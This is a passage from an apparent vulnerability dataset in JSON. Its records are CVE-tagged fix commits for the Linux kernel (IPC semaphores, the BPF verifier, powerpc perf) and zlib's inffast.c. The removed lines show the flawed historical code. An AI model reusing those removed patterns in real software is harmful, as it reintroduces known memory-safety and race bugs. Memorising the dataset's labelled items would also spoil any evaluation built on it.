\t\t\terr = -EIDRM;\n \t\t\tgoto out_free;\n \t\t}\n@@ -1124,7 +1203,7 @@ static int semctl_main(struct ipc_namespace *ns, int semid, int semnum,\n \t\tgoto out_wakeup;\n \t}\n \n-\tspin_lock(&sma->sem_perm.lock);\n+\tsem_lock(sma, NULL, -1);\n \tcurr = &sma->sem_base[semnum];\n \n \tswitch (cmd) {\n@@ -1143,7 +1222,7 @@ static int semctl_main(struct ipc_namespace *ns, int semid, int semnum,\n \t}\n \n out_unlock:\n-\tsem_unlock(sma);\n+\tsem_unlock(sma, -1);\n out_wakeup:\n \twake_up_sem_queue_do(&tasks);\n out_free:\n@@ -1211,11 +1290,11 @@ static int semctl_down(struct ipc_namespace *ns, int semid,\n \n \tswitch(cmd){\n \tcase IPC_RMID:\n-\t\tipc_lock_object(&sma->sem_perm);\n+\t\tsem_lock(sma, NULL, -1);\n \t\tfreeary(ns, ipcp);\n \t\tgoto out_up;\n \tcase IPC_SET:\n-\t\tipc_lock_object(&sma->sem_perm);\n+\t\tsem_lock(sma, NULL, -1);\n \t\terr = ipc_update_perm(&semid64.sem_perm, ipcp);\n \t\tif (err)\n \t\t\tgoto out_unlock;\n@@ -1228,7 +1307,7 @@ static int semctl_down(struct ipc_namespace *ns, int semid,\n \t}\n \n out_unlock:\n-\tsem_unlock(sma);\n+\tsem_unlock(sma, -1);\n out_up:\n \tup_write(&sem_ids(ns).rw_mutex);\n \treturn err;\n@@ -1340,8 +1419,7 @@ static struct sem_undo *find_alloc_undo(struct ipc_namespace *ns, int semid)\n \tstruct sem_array *sma;\n \tstruct sem_undo_list *ulp;\n \tstruct sem_undo *un, *new;\n-\tint nsems;\n-\tint error;\n+\tint nsems, error;\n \n \terror = get_undo_list(&ulp);\n \tif (error)\n@@ -1363,7 +1441,11 @@ static struct sem_undo *find_alloc_undo(struct ipc_namespace *ns, int semid)\n \t}\n \n \tnsems = sma->sem_nsems;\n-\tipc_rcu_getref(sma);\n+\tif (!ipc_rcu_getref(sma)) {\n+\t\trcu_read_unlock();\n+\t\tun = ERR_PTR(-EIDRM);\n+\t\tgoto out;\n+\t}\n \trcu_read_unlock();\n \n \t\/* step 2: allocate new undo structure *\/\n@@ -1376,7 +1458,7 @@ static struct sem_undo *find_alloc_undo(struct ipc_namespace *ns, int semid)\n \t\/* step 3: Acquire the lock on semaphore array *\/\n \tsem_lock_and_putref(sma);\n \tif (sma->sem_perm.deleted) {\n-\t\tsem_unlock(sma);\n+\t\tsem_unlock(sma, -1);\n \t\tkfree(new);\n \t\tun = ERR_PTR(-EIDRM);\n \t\tgoto out;\n@@ -1404,7 +1486,7 @@ static struct sem_undo *find_alloc_undo(struct ipc_namespace *ns, int semid)\n success:\n \tspin_unlock(&ulp->lock);\n \trcu_read_lock();\n-\tsem_unlock(sma);\n+\tsem_unlock(sma, -1);\n out:\n \treturn un;\n }\n@@ -1444,7 +1526,7 @@ SYSCALL_DEFINE4(semtimedop, int, semid, struct sembuf __user *, tsops,\n \tstruct sembuf fast_sops[SEMOPM_FAST];\n \tstruct sembuf* sops = fast_sops, *sop;\n \tstruct sem_undo *un;\n-\tint undos = 0, alter = 0, max;\n+\tint undos = 0, alter = 0, max, locknum;\n \tstruct sem_queue queue;\n \tunsigned long jiffies_left = 0;\n \tstruct ipc_namespace *ns;\n@@ -1488,22 +1570,23 @@ SYSCALL_DEFINE4(semtimedop, int, semid, struct sembuf __user *, tsops,\n \t\t\talter = 1;\n \t}\n \n+\tINIT_LIST_HEAD(&tasks);\n+\n \tif (undos) {\n+\t\t\/* On success, find_alloc_undo takes the rcu_read_lock *\/\n \t\tun = find_alloc_undo(ns, semid);\n \t\tif (IS_ERR(un)) {\n \t\t\terror = PTR_ERR(un);\n \t\t\tgoto out_free;\n \t\t}\n-\t} else\n+\t} else {\n \t\tun = NULL;\n+\t\trcu_read_lock();\n+\t}\n \n-\tINIT_LIST_HEAD(&tasks);\n-\n-\trcu_read_lock();\n \tsma = sem_obtain_object_check(ns, semid);\n \tif (IS_ERR(sma)) {\n-\t\tif (un)\n-\t\t\trcu_read_unlock();\n+\t\trcu_read_unlock();\n \t\terror = PTR_ERR(sma);\n \t\tgoto out_free;\n \t}\n@@ -1534,23 +1617,9 @@ SYSCALL_DEFINE4(semtimedop, int, semid, struct sembuf __user *, tsops,\n \t * \"un\" itself is guaranteed by rcu.\n \t *\/\n \terror = -EIDRM;\n-\tipc_lock_object(&sma->sem_perm);\n-\tif (un) {\n-\t\tif (un->semid == -1) {\n-\t\t\trcu_read_unlock();\n-\t\t\tgoto out_unlock_free;\n-\t\t} else {\n-\t\t\t\/*\n-\t\t\t * rcu lock can be released, \"un\" cannot disappear:\n-\t\t\t * - sem_lock is acquired, thus IPC_RMID is\n-\t\t\t *   impossible.\n-\t\t\t * - exit_sem is impossible, it always operates on\n-\t\t\t *   current (or a dead task).\n-\t\t\t *\/\n-\n-\t\t\trcu_read_unlock();\n-\t\t}\n-\t}\n+\tlocknum = sem_lock(sma, sops, nsops);\n+\tif (un && un->semid == -1)\n+\t\tgoto out_unlock_free;\n \n \terror = try_atomic_semop (sma, sops, nsops, un, task_tgid_vnr(current));\n \tif (error <= 0) {\n@@ -1591,7 +1660,7 @@ SYSCALL_DEFINE4(semtimedop, int, semid, struct sembuf __user *, tsops,\n \n sleep_again:\n \tcurrent->state = TASK_INTERRUPTIBLE;\n-\tsem_unlock(sma);\n+\tsem_unlock(sma, locknum);\n \n \tif (timeout)\n \t\tjiffies_left = schedule_timeout(jiffies_left);\n@@ -1613,7 +1682,7 @@ sleep_again:\n \t\tgoto out_free;\n \t}\n \n-\tsma = sem_obtain_lock(ns, semid);\n+\tsma = sem_obtain_lock(ns, semid, sops, nsops, &locknum);\n \n \t\/*\n \t * Wait until it's guaranteed that no wakeup_sem_queue_do() is ongoing.\n@@ -1652,7 +1721,7 @@ sleep_again:\n \tunlink_queue(sma, &queue);\n \n out_unlock_free:\n-\tsem_unlock(sma);\n+\tsem_unlock(sma, locknum);\n out_wakeup:\n \twake_up_sem_queue_do(&tasks);\n out_free:\n@@ -1716,8 +1785,7 @@ void exit_sem(struct task_struct *tsk)\n \t\tstruct sem_array *sma;\n \t\tstruct sem_undo *un;\n \t\tstruct list_head tasks;\n-\t\tint semid;\n-\t\tint i;\n+\t\tint semid, i;\n \n \t\trcu_read_lock();\n \t\tun = list_entry_rcu(ulp->list_proc.next,\n@@ -1726,23 +1794,26 @@ void exit_sem(struct task_struct *tsk)\n \t\t\tsemid = -1;\n \t\t else\n \t\t\tsemid = un->semid;\n-\t\trcu_read_unlock();\n \n-\t\tif (semid == -1)\n+\t\tif (semid == -1) {\n+\t\t\trcu_read_unlock();\n \t\t\tbreak;\n+\t\t}\n \n-\t\tsma = sem_lock_check(tsk->nsproxy->ipc_ns, un->semid);\n-\n+\t\tsma = sem_obtain_object_check(tsk->nsproxy->ipc_ns, un->semid);\n \t\t\/* exit_sem raced with IPC_RMID, nothing to do *\/\n-\t\tif (IS_ERR(sma))\n+\t\tif (IS_ERR(sma)) {\n+\t\t\trcu_read_unlock();\n \t\t\tcontinue;\n+\t\t}\n \n+\t\tsem_lock(sma, NULL, -1);\n \t\tun = __lookup_undo(ulp, semid);\n \t\tif (un == NULL) {\n \t\t\t\/* exit_sem raced with IPC_RMID+semget() that created\n \t\t\t * exactly the same semid. Nothing to do.\n \t\t\t *\/\n-\t\t\tsem_unlock(sma);\n+\t\t\tsem_unlock(sma, -1);\n \t\t\tcontinue;\n \t\t}\n \n@@ -1782,7 +1853,7 @@ void exit_sem(struct task_struct *tsk)\n \t\t\/* maybe some queued-up processes were waiting for this *\/\n \t\tINIT_LIST_HEAD(&tasks);\n \t\tdo_smart_update(sma, NULL, 0, 1, &tasks);\n-\t\tsem_unlock(sma);\n+\t\tsem_unlock(sma, -1);\n \t\twake_up_sem_queue_do(&tasks);\n \n \t\tkfree_rcu(un, rcu);\ndiff --git a\/ipc\/util.c b\/ipc\/util.c\nindex 3df0af3158a5..579201e4bc01 100644\n--- a\/ipc\/util.c\n+++ b\/ipc\/util.c\n@@ -439,9 +439,9 @@ void ipc_rmid(struct ipc_ids *ids, struct kern_ipc_perm *ipcp)\n  *\tNULL is returned if the allocation fails\n  *\/\n  \n-void* ipc_alloc(int size)\n+void *ipc_alloc(int size)\n {\n-\tvoid* out;\n+\tvoid *out;\n \tif(size > PAGE_SIZE)\n \t\tout = vmalloc(size);\n \telse\n@@ -478,7 +478,7 @@ void ipc_free(void* ptr, int size)\n  *\/\n struct ipc_rcu_hdr\n {\n-\tint refcount;\n+\tatomic_t refcount;\n \tint is_vmalloc;\n \tvoid *data[0];\n };\n@@ -516,39 +516,41 @@ static inline int rcu_use_vmalloc(int size)\n  *\t@size: size desired\n  *\n  *\tAllocate memory for the rcu header structure +  the object.\n- *\tReturns the pointer to the object.\n- *\tNULL is returned if the allocation fails. \n+ *\tReturns the pointer to the object or NULL upon failure.\n  *\/\n- \n-void* ipc_rcu_alloc(int size)\n+void *ipc_rcu_alloc(int size)\n {\n-\tvoid* out;\n-\t\/* \n+\tvoid *out;\n+\n+\t\/*\n \t * We prepend the allocation with the rcu struct, and\n-\t * workqueue if necessary (for vmalloc). \n+\t * workqueue if necessary (for vmalloc).\n \t *\/\n \tif (rcu_use_vmalloc(size)) {\n \t\tout = vmalloc(HDRLEN_VMALLOC + size);\n-\t\tif (out) {\n-\t\t\tout += HDRLEN_VMALLOC;\n-\t\t\tcontainer_of(out, struct ipc_rcu_hdr, data)->is_vmalloc = 1;\n-\t\t\tcontainer_of(out, struct ipc_rcu_hdr, data)->refcount = 1;\n-\t\t}\n+\t\tif (!out)\n+\t\t\tgoto done;\n+\n+\t\tout += HDRLEN_VMALLOC;\n+\t\tcontainer_of(out, struct ipc_rcu_hdr, data)->is_vmalloc = 1;\n \t} else {\n \t\tout = kmalloc(HDRLEN_KMALLOC + size, GFP_KERNEL);\n-\t\tif (out) {\n-\t\t\tout += HDRLEN_KMALLOC;\n-\t\t\tcontainer_of(out, struct ipc_rcu_hdr, data)->is_vmalloc = 0;\n-\t\t\tcontainer_of(out, struct ipc_rcu_hdr, data)->refcount = 1;\n-\t\t}\n+\t\tif (!out)\n+\t\t\tgoto done;\n+\n+\t\tout += HDRLEN_KMALLOC;\n+\t\tcontainer_of(out, struct ipc_rcu_hdr, data)->is_vmalloc = 0;\n \t}\n \n+\t\/* set reference counter no matter what kind of allocation was done *\/\n+\tatomic_set(&container_of(out, struct ipc_rcu_hdr, data)->refcount, 1);\n+done:\n \treturn out;\n }\n \n-void ipc_rcu_getref(void *ptr)\n+int ipc_rcu_getref(void *ptr)\n {\n-\tcontainer_of(ptr, struct ipc_rcu_hdr, data)->refcount++;\n+\treturn atomic_inc_not_zero(&container_of(ptr, struct ipc_rcu_hdr, data)->refcount);\n }\n \n static void ipc_do_vfree(struct work_struct *work)\n@@ -578,7 +580,7 @@ static void ipc_schedule_free(struct rcu_head *head)\n \n void ipc_rcu_putref(void *ptr)\n {\n-\tif (--container_of(ptr, struct ipc_rcu_hdr, data)->refcount > 0)\n+\tif (!atomic_dec_and_test(&container_of(ptr, struct ipc_rcu_hdr, data)->refcount))\n \t\treturn;\n \n \tif (container_of(ptr, struct ipc_rcu_hdr, data)->is_vmalloc) {\ndiff --git a\/ipc\/util.h b\/ipc\/util.h\nindex c36b9977c957..2b0bdd5d92ce 100644\n--- a\/ipc\/util.h\n+++ b\/ipc\/util.h\n@@ -119,7 +119,7 @@ void ipc_free(void* ptr, int size);\n  * to 0 schedules the rcu destruction. Caller must guarantee locking.\n  *\/\n void* ipc_rcu_alloc(int size);\n-void ipc_rcu_getref(void *ptr);\n+int ipc_rcu_getref(void *ptr);\n void ipc_rcu_putref(void *ptr);\n \n struct kern_ipc_perm *ipc_lock(struct ipc_ids *, int);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2019-7308","CWE_ID":"189","category":"security","commit_id":"d3bd7413e0ca40b60cf60d4003246d067cafdeda","commit_message":"From d3bd7413e0ca40b60cf60d4003246d067cafdeda Mon Sep 17 00:00:00 2001\nFrom: Daniel Borkmann <daniel@iogearbox.net>\nDate: Sun, 6 Jan 2019 00:54:37 +0100\nSubject: bpf: fix sanitation of alu op with pointer \/ scalar type from\n different paths\n\nWhile 979d63d50c0c (\"bpf: prevent out of bounds speculation on pointer\narithmetic\") took care of rejecting alu op on pointer when e.g. pointer\ncame from two different map values with different map properties such as\nvalue size, Jann reported that a case was not covered yet when a given\nalu op is used in both \"ptr_reg += reg\" and \"numeric_reg += reg\" from\ndifferent branches where we would incorrectly try to sanitize based\non the pointer's limit. Catch this corner case and reject the program\ninstead.\n\nFixes: 979d63d50c0c (\"bpf: prevent out of bounds speculation on pointer arithmetic\")\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>\nAcked-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\n---\n include\/linux\/bpf_verifier.h |  1 +\n kernel\/bpf\/verifier.c        | 61 ++++++++++++++++++++++++++++++++++----------\n 2 files changed, 49 insertions(+), 13 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/bpf_verifier.h b\/include\/linux\/bpf_verifier.h\nindex 27b74947cd2b..573cca00a0e6 100644\n--- a\/include\/linux\/bpf_verifier.h\n+++ b\/include\/linux\/bpf_verifier.h\n@@ -172,6 +172,7 @@ struct bpf_verifier_state_list {\n #define BPF_ALU_SANITIZE_SRC\t\t1U\n #define BPF_ALU_SANITIZE_DST\t\t2U\n #define BPF_ALU_NEG_VALUE\t\t(1U << 2)\n+#define BPF_ALU_NON_POINTER\t\t(1U << 3)\n #define BPF_ALU_SANITIZE\t\t(BPF_ALU_SANITIZE_SRC | \\\n \t\t\t\t\t BPF_ALU_SANITIZE_DST)\n \ndiff --git a\/kernel\/bpf\/verifier.c b\/kernel\/bpf\/verifier.c\nindex f6bc62a9ee8e..56674a7c3778 100644\n--- a\/kernel\/bpf\/verifier.c\n+++ b\/kernel\/bpf\/verifier.c\n@@ -3103,6 +3103,40 @@ static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,\n \t}\n }\n \n+static bool can_skip_alu_sanitation(const struct bpf_verifier_env *env,\n+\t\t\t\t    const struct bpf_insn *insn)\n+{\n+\treturn env->allow_ptr_leaks || BPF_SRC(insn->code) == BPF_K;\n+}\n+\n+static int update_alu_sanitation_state(struct bpf_insn_aux_data *aux,\n+\t\t\t\t       u32 alu_state, u32 alu_limit)\n+{\n+\t\/* If we arrived here from different branches with different\n+\t * state or limits to sanitize, then this won't work.\n+\t *\/\n+\tif (aux->alu_state &&\n+\t    (aux->alu_state != alu_state ||\n+\t     aux->alu_limit != alu_limit))\n+\t\treturn -EACCES;\n+\n+\t\/* Corresponding fixup done in fixup_bpf_calls(). *\/\n+\taux->alu_state = alu_state;\n+\taux->alu_limit = alu_limit;\n+\treturn 0;\n+}\n+\n+static int sanitize_val_alu(struct bpf_verifier_env *env,\n+\t\t\t    struct bpf_insn *insn)\n+{\n+\tstruct bpf_insn_aux_data *aux = cur_aux(env);\n+\n+\tif (can_skip_alu_sanitation(env, insn))\n+\t\treturn 0;\n+\n+\treturn update_alu_sanitation_state(aux, BPF_ALU_NON_POINTER, 0);\n+}\n+\n static int sanitize_ptr_alu(struct bpf_verifier_env *env,\n \t\t\t    struct bpf_insn *insn,\n \t\t\t    const struct bpf_reg_state *ptr_reg,\n@@ -3117,7 +3151,7 @@ static int sanitize_ptr_alu(struct bpf_verifier_env *env,\n \tstruct bpf_reg_state tmp;\n \tbool ret;\n \n-\tif (env->allow_ptr_leaks || BPF_SRC(insn->code) == BPF_K)\n+\tif (can_skip_alu_sanitation(env, insn))\n \t\treturn 0;\n \n \t\/* We already marked aux for masking from non-speculative\n@@ -3133,19 +3167,8 @@ static int sanitize_ptr_alu(struct bpf_verifier_env *env,\n \n \tif (retrieve_ptr_limit(ptr_reg, &alu_limit, opcode, off_is_neg))\n \t\treturn 0;\n-\n-\t\/* If we arrived here from different branches with different\n-\t * limits to sanitize, then this won't work.\n-\t *\/\n-\tif (aux->alu_state &&\n-\t    (aux->alu_state != alu_state ||\n-\t     aux->alu_limit != alu_limit))\n+\tif (update_alu_sanitation_state(aux, alu_state, alu_limit))\n \t\treturn -EACCES;\n-\n-\t\/* Corresponding fixup done in fixup_bpf_calls(). *\/\n-\taux->alu_state = alu_state;\n-\taux->alu_limit = alu_limit;\n-\n do_sim:\n \t\/* Simulate and find potential out-of-bounds access under\n \t * speculative execution from truncation as a result of\n@@ -3418,6 +3441,8 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,\n \ts64 smin_val, smax_val;\n \tu64 umin_val, umax_val;\n \tu64 insn_bitness = (BPF_CLASS(insn->code) == BPF_ALU64) ? 64 : 32;\n+\tu32 dst = insn->dst_reg;\n+\tint ret;\n \n \tif (insn_bitness == 32) {\n \t\t\/* Relevant for 32-bit RSH: Information can propagate towards\n@@ -3452,6 +3477,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,\n \n \tswitch (opcode) {\n \tcase BPF_ADD:\n+\t\tret = sanitize_val_alu(env, insn);\n+\t\tif (ret < 0) {\n+\t\t\tverbose(env, \"R%d tried to add from different pointers or scalars\\n\", dst);\n+\t\t\treturn ret;\n+\t\t}\n \t\tif (signed_add_overflows(dst_reg->smin_value, smin_val) ||\n \t\t    signed_add_overflows(dst_reg->smax_value, smax_val)) {\n \t\t\tdst_reg->smin_value = S64_MIN;\n@@ -3471,6 +3501,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,\n \t\tdst_reg->var_off = tnum_add(dst_reg->var_off, src_reg.var_off);\n \t\tbreak;\n \tcase BPF_SUB:\n+\t\tret = sanitize_val_alu(env, insn);\n+\t\tif (ret < 0) {\n+\t\t\tverbose(env, \"R%d tried to sub from different pointers or scalars\\n\", dst);\n+\t\t\treturn ret;\n+\t\t}\n \t\tif (signed_sub_overflows(dst_reg->smin_value, smax_val) ||\n \t\t    signed_sub_overflows(dst_reg->smax_value, smin_val)) {\n \t\t\t\/* Overflow possible, we know nothing *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-4611","CWE_ID":"189","category":"security","commit_id":"0837e3242c73566fc1c0196b4ec61779c25ffc93","commit_message":"From 0837e3242c73566fc1c0196b4ec61779c25ffc93 Mon Sep 17 00:00:00 2001\nFrom: Anton Blanchard <anton@samba.org>\nDate: Wed, 9 Mar 2011 14:38:42 +1100\nSubject: perf, powerpc: Handle events that raise an exception without\n overflowing\n\nEvents on POWER7 can roll back if a speculative event doesn't\neventually complete. Unfortunately in some rare cases they will\nraise a performance monitor exception. We need to catch this to\nensure we reset the PMC. In all cases the PMC will be 256 or less\ncycles from overflow.\n\nSigned-off-by: Anton Blanchard <anton@samba.org>\nSigned-off-by: Peter Zijlstra <a.p.zijlstra@chello.nl>\nCc: <stable@kernel.org> # as far back as it applies cleanly\nLKML-Reference: <20110309143842.6c22845e@kryten>\nSigned-off-by: Ingo Molnar <mingo@elte.hu>\n---\n arch\/powerpc\/include\/asm\/reg.h   |  1 +\n arch\/powerpc\/kernel\/perf_event.c | 24 +++++++++++++++++++++++-\n 2 files changed, 24 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/powerpc\/include\/asm\/reg.h b\/arch\/powerpc\/include\/asm\/reg.h\nindex 125fc1ad665d..7626fa78e1f8 100644\n--- a\/arch\/powerpc\/include\/asm\/reg.h\n+++ b\/arch\/powerpc\/include\/asm\/reg.h\n@@ -880,6 +880,7 @@\n #define PV_970\t\t0x0039\n #define PV_POWER5\t0x003A\n #define PV_POWER5p\t0x003B\n+#define PV_POWER7\t0x003F\n #define PV_970FX\t0x003C\n #define PV_630\t\t0x0040\n #define PV_630p\t0x0041\ndiff --git a\/arch\/powerpc\/kernel\/perf_event.c b\/arch\/powerpc\/kernel\/perf_event.c\nindex ab6f6beadb57..97e0ae414940 100644\n--- a\/arch\/powerpc\/kernel\/perf_event.c\n+++ b\/arch\/powerpc\/kernel\/perf_event.c\n@@ -1269,6 +1269,28 @@ unsigned long perf_instruction_pointer(struct pt_regs *regs)\n \treturn ip;\n }\n \n+static bool pmc_overflow(unsigned long val)\n+{\n+\tif ((int)val < 0)\n+\t\treturn true;\n+\n+\t\/*\n+\t * Events on POWER7 can roll back if a speculative event doesn't\n+\t * eventually complete. Unfortunately in some rare cases they will\n+\t * raise a performance monitor exception. We need to catch this to\n+\t * ensure we reset the PMC. In all cases the PMC will be 256 or less\n+\t * cycles from overflow.\n+\t *\n+\t * We only do this if the first pass fails to find any overflowing\n+\t * PMCs because a user might set a period of less than 256 and we\n+\t * don't want to mistakenly reset them.\n+\t *\/\n+\tif (__is_processor(PV_POWER7) && ((0x80000000 - val) <= 256))\n+\t\treturn true;\n+\n+\treturn false;\n+}\n+\n \/*\n  * Performance monitor interrupt stuff\n  *\/\n@@ -1316,7 +1338,7 @@ static void perf_event_interrupt(struct pt_regs *regs)\n \t\t\tif (is_limited_pmc(i + 1))\n \t\t\t\tcontinue;\n \t\t\tval = read_pmc(i + 1);\n-\t\t\tif ((int)val < 0)\n+\t\t\tif (pmc_overflow(val))\n \t\t\t\twrite_pmc(i + 1, 0);\n \t\t}\n \t}\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-9841","CWE_ID":"189","category":"security","commit_id":"9aaec95e82117c1cb0f9624264c3618fc380cecb","commit_message":"From 9aaec95e82117c1cb0f9624264c3618fc380cecb Mon Sep 17 00:00:00 2001\nFrom: Mark Adler <madler@alumni.caltech.edu>\nDate: Wed, 21 Sep 2016 22:25:21 -0700\nSubject: [PATCH] Use post-increment only in inffast.c.\n\nAn old inffast.c optimization turns out to not be optimal anymore\nwith modern compilers, and furthermore was not compliant with the\nC standard, for which decrementing a pointer before its allocated\nmemory is undefined. Per the recommendation of a security audit of\nthe zlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this \"optimization\" was removed, in order to\navoid the possibility of undefined behavior.\n---\n inffast.c | 81 +++++++++++++++++++++----------------------------------\n 1 file changed, 31 insertions(+), 50 deletions(-)\n\n","diff_code":"diff --git a\/inffast.c b\/inffast.c\nindex bda59ceb..f0d163db 100644\n--- a\/inffast.c\n+++ b\/inffast.c\n@@ -10,25 +10,6 @@\n \n #ifndef ASMINF\n \n-\/* Allow machine dependent optimization for post-increment or pre-increment.\n-   Based on testing to date,\n-   Pre-increment preferred for:\n-   - PowerPC G3 (Adler)\n-   - MIPS R5000 (Randers-Pehrson)\n-   Post-increment preferred for:\n-   - none\n-   No measurable difference:\n-   - Pentium III (Anderson)\n-   - M68060 (Nikl)\n- *\/\n-#ifdef POSTINC\n-#  define OFF 0\n-#  define PUP(a) *(a)++\n-#else\n-#  define OFF 1\n-#  define PUP(a) *++(a)\n-#endif\n-\n \/*\n    Decode literal, length, and distance codes and write out the resulting\n    literal and match bytes until either not enough input or output is\n@@ -96,9 +77,9 @@ unsigned start;         \/* inflate()'s starting value for strm->avail_out *\/\n \n     \/* copy state to local variables *\/\n     state = (struct inflate_state FAR *)strm->state;\n-    in = strm->next_in - OFF;\n+    in = strm->next_in;\n     last = in + (strm->avail_in - 5);\n-    out = strm->next_out - OFF;\n+    out = strm->next_out;\n     beg = out - (start - strm->avail_out);\n     end = out + (strm->avail_out - 257);\n #ifdef INFLATE_STRICT\n@@ -119,9 +100,9 @@ unsigned start;         \/* inflate()'s starting value for strm->avail_out *\/\n        input data or output space *\/\n     do {\n         if (bits < 15) {\n-            hold += (unsigned long)(PUP(in)) << bits;\n+            hold += (unsigned long)(*in++) << bits;\n             bits += 8;\n-            hold += (unsigned long)(PUP(in)) << bits;\n+            hold += (unsigned long)(*in++) << bits;\n             bits += 8;\n         }\n         here = lcode[hold & lmask];\n@@ -134,14 +115,14 @@ unsigned start;         \/* inflate()'s starting value for strm->avail_out *\/\n             Tracevv((stderr, here.val >= 0x20 && here.val < 0x7f ?\n                     \"inflate:         literal '%c'\\n\" :\n                     \"inflate:         literal 0x%02x\\n\", here.val));\n-            PUP(out) = (unsigned char)(here.val);\n+            *out++ = (unsigned char)(here.val);\n         }\n         else if (op & 16) {                     \/* length base *\/\n             len = (unsigned)(here.val);\n             op &= 15;                           \/* number of extra bits *\/\n             if (op) {\n                 if (bits < op) {\n-                    hold += (unsigned long)(PUP(in)) << bits;\n+                    hold += (unsigned long)(*in++) << bits;\n                     bits += 8;\n                 }\n                 len += (unsigned)hold & ((1U << op) - 1);\n@@ -150,9 +131,9 @@ unsigned start;         \/* inflate()'s starting value for strm->avail_out *\/\n             }\n             Tracevv((stderr, \"inflate:         length %u\\n\", len));\n             if (bits < 15) {\n-                hold += (unsigned long)(PUP(in)) << bits;\n+                hold += (unsigned long)(*in++) << bits;\n                 bits += 8;\n-                hold += (unsigned long)(PUP(in)) << bits;\n+                hold += (unsigned long)(*in++) << bits;\n                 bits += 8;\n             }\n             here = dcode[hold & dmask];\n@@ -165,10 +146,10 @@ unsigned start;         \/* inflate()'s starting value for strm->avail_out *\/\n                 dist = (unsigned)(here.val);\n                 op &= 15;                       \/* number of extra bits *\/\n                 if (bits < op) {\n-                    hold += (unsigned long)(PUP(in)) << bits;\n+                    hold += (unsigned long)(*in++) << bits;\n                     bits += 8;\n                     if (bits < op) {\n-                        hold += (unsigned long)(PUP(in)) << bits;\n+                        hold += (unsigned long)(*in++) << bits;\n                         bits += 8;\n                     }\n                 }\n@@ -196,30 +177,30 @@ unsigned start;         \/* inflate()'s starting value for strm->avail_out *\/\n #ifdef INFLATE_ALLOW_INVALID_DISTANCE_TOOFAR_ARRR\n                         if (len <= op - whave) {\n                             do {\n-                                PUP(out) = 0;\n+                                *out++ = 0;\n                             } while (--len);\n                             continue;\n                         }\n                         len -= op - whave;\n                         do {\n-                            PUP(out) = 0;\n+                            *out++ = 0;\n                         } while (--op > whave);\n                         if (op == 0) {\n                             from = out - dist;\n                             do {\n-                                PUP(out) = PUP(from);\n+                                *out++ = *from++;\n                             } while (--len);\n                             continue;\n                         }\n #endif\n                     }\n-                    from = window - OFF;\n+                    from = window;\n                     if (wnext == 0) {           \/* very common case *\/\n                         from += wsize - op;\n                         if (op < len) {         \/* some from window *\/\n                             len -= op;\n                             do {\n-                                PUP(out) = PUP(from);\n+                                *out++ = *from++;\n                             } while (--op);\n                             from = out - dist;  \/* rest from output *\/\n                         }\n@@ -230,14 +211,14 @@ unsigned start;         \/* inflate()'s starting value for strm->avail_out *\/\n                         if (op < len) {         \/* some from end of window *\/\n                             len -= op;\n                             do {\n-                                PUP(out) = PUP(from);\n+                                *out++ = *from++;\n                             } while (--op);\n-                            from = window - OFF;\n+                            from = window;\n                             if (wnext < len) {  \/* some from start of window *\/\n                                 op = wnext;\n                                 len -= op;\n                                 do {\n-                                    PUP(out) = PUP(from);\n+                                    *out++ = *from++;\n                                 } while (--op);\n                                 from = out - dist;      \/* rest from output *\/\n                             }\n@@ -248,35 +229,35 @@ unsigned start;         \/* inflate()'s starting value for strm->avail_out *\/\n                         if (op < len) {         \/* some from window *\/\n                             len -= op;\n                             do {\n-                                PUP(out) = PUP(from);\n+                                *out++ = *from++;\n                             } while (--op);\n                             from = out - dist;  \/* rest from output *\/\n                         }\n                     }\n                     while (len > 2) {\n-                        PUP(out) = PUP(from);\n-                        PUP(out) = PUP(from);\n-                        PUP(out) = PUP(from);\n+                        *out++ = *from++;\n+                        *out++ = *from++;\n+                        *out++ = *from++;\n                         len -= 3;\n                     }\n                     if (len) {\n-                        PUP(out) = PUP(from);\n+                        *out++ = *from++;\n                         if (len > 1)\n-                            PUP(out) = PUP(from);\n+                            *out++ = *from++;\n                     }\n                 }\n                 else {\n                     from = out - dist;          \/* copy direct from output *\/\n                     do {                        \/* minimum length is three *\/\n-                        PUP(out) = PUP(from);\n-                        PUP(out) = PUP(from);\n-                        PUP(out) = PUP(from);\n+                        *out++ = *from++;\n+                        *out++ = *from++;\n+                        *out++ = *from++;\n                         len -= 3;\n                     } while (len > 2);\n                     if (len) {\n-                        PUP(out) = PUP(from);\n+                        *out++ = *from++;\n                         if (len > 1)\n-                            PUP(out) = PUP(from);\n+                            *out++ = *from++;\n                     }\n                 }\n             }\n@@ -313,8 +294,8 @@ unsigned start;         \/* inflate()'s starting value for strm->avail_out *\/\n     hold &= (1U << bits) - 1;\n \n     \/* update state and return *\/\n-    strm->next_in = in + OFF;\n-    strm->next_out = out + OFF;\n+    strm->next_in = in;\n+    strm->next_out = out;\n     strm->avail_in = (unsigned)(in < last ? 5 + (last - in) : 5 - (in - last));\n     strm->avail_out = (unsigned)(out < end ?\n                                  257 + (end - out) : 257 - (out - end));\n","owner":"madler","repo":"zlib","source":"cve"},{"CVE_ID":"CVE-2015-4167","CWE_ID":"189","category":"security","commit_id":"23b133bdc452aa441fcb9b82cbf6dd05cfd342d0","commit_message":"From 23b133bdc452aa441fcb9b82cbf6dd05cfd342d0 Mon Sep 17 00:00:00 2001\nFrom: Jan Kara <jack@suse.cz>\nDate: Wed, 7 Jan 2015 13:49:08 +0100\nSubject: udf: Check length of extended attributes and allocation descriptors\n\nCheck length of extended attributes and allocation descriptors when\nloading inodes from disk. Otherwise corrupted filesystems could confuse\nthe code and make the kernel oops.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no>\nCC: stable@vger.kernel.org\nSigned-off-by: Jan Kara <jack@suse.cz>\n---\n fs\/udf\/inode.c | 